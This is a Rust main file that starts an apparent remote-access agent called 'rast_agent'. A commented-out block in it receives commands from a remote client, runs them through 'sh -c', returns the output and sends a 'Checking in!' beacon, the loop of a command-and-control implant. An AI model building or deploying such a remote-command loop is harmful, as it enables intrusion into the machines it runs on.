use anyhow::Result;
use rast::settings::Settings;
use rast_agent::RastAgent;
use tracing::info;
use tracing_subscriber::filter::LevelFilter;

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(LevelFilter::INFO)
        .init();

    // TODO: add embedding during compile
    let settings = match Settings::new() {
        Ok(settings) => {
            info!("{settings:?}");
            settings
        },
        Err(e) => {
            panic!("{e:?}");
        },
    };

    let mut agent = RastAgent::with_settings(settings).await?;
    agent.run().await?;

    // let cmd = client.lock().unwrap().recv().await?;
    // let cmd = get_message(cmd).unwrap();
    // let cmd = cmd.trim_end_matches('\0');

    // let output = Command::new("sh").arg("-c").arg(cmd).output()?;
    // let mut output =
    // String::from_utf8_lossy(&output.stdout).to_string();

    // if output.is_empty() {
    //    output.push('\n');
    //}

    // let msg = create_message(&output);
    // client.lock().unwrap().send(msg).await?;
    // let msg_s = "Checking in!";
    // client.send(msg_s.to_string()).await?;
    // info!("Message sent: {}", msg_s);

    Ok(())
}
